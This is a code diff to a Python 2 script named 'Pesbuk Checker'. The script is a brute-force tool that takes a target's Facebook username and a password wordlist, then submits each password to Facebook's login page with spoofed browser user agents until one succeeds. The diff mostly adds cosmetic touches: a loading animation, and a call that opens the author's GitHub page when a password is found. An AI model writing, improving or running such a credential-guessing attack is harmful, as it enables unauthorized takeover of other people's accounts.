@@ -1,10 +1,18 @@
 #!/usr/bin/python
-# -*- coding: UTF-8 -*-
+# -*- coding: utf-8 -*-
 # Pesbuk Checker
 # Coded by Senja
 # Github: github.com/thedarksec/Pesbukchecker
 
 import os, sys, time, random, cookielib, mechanize
+
+def loads():
+    tix = [
+     '.   ', '..  ', '... ']
+    for o in tix:
+        print '\r\x1b[0m[\x1b[94;1m\xe2\x97\x8f\x1b[0m] \x1b[0mProcessing ' + o,
+        sys.stdout.flush()
+        time.sleep(1)
 
 def write(a):
         for q in a + '\n':
@@ -25,7 +33,7 @@ def banner():
     print ('     \x1b[0;90;47;1m * \x1b[0;1;104m Coded by \x1b[0;1;101m # Senja \x1b[0m')
     print
     print
-    time.sleep(1)
+
 banner()
 
 email_target = str(raw_input('\x1b[0m[\x1b[96;1m?\x1b[0m] \x1b[77;1mUsername: \x1b[0m'))
@@ -34,7 +42,6 @@ write ('\x1b[77;1;4mN O T E: \x1b[0;4mEnter the wordlist name*\x1b[0m')
 password_list = str(raw_input('\x1b[0m[\x1b[95;1m+\x1b[0m] \x1b[77;1mPassword: \x1b[0m'))
 login = 'https://www.facebook.com/login.php?login_attempt=1'
 useragents = [('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Geck')]
-# useragents = [('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36','Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36','Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36','Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36','Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36','Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36','Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36',)]
 
 def restart_program():
                 print
@@ -99,6 +106,7 @@ def word(lst_password):
         ok = br.submit()
         mask = ok.geturl()
         if mask != login and (not 'login_attempt' in mask):
+                        os.system('xdg-open https://github.com/thedarksec/')
                         print
                         print ('\x1b[0m[\x1b[94;1m+\x1b[0m] \x1b[77;1mSuccess')
                         print ('\x1b[0m[\x1b[96;1m&\x1b[0m] \x1b[77;1mChecker Password Find')
@@ -132,7 +140,8 @@ def running():
          time.sleep(5)
          print '\x1b[0m[\x1b[92;1m#\x1b[0m] \x1b[77;1mUsername: \x1b[0m{}'.format(email_target)
          print '\x1b[0m[\x1b[93;1m*\x1b[0m] \x1b[77;1mPassword: ',len(ok),'password'
-         write ('\x1b[0m[\x1b[94;1m/\x1b[0m] \x1b[77;1mProcess Checking...')
+         loads()
+         print
          print
          time.sleep(5)
 
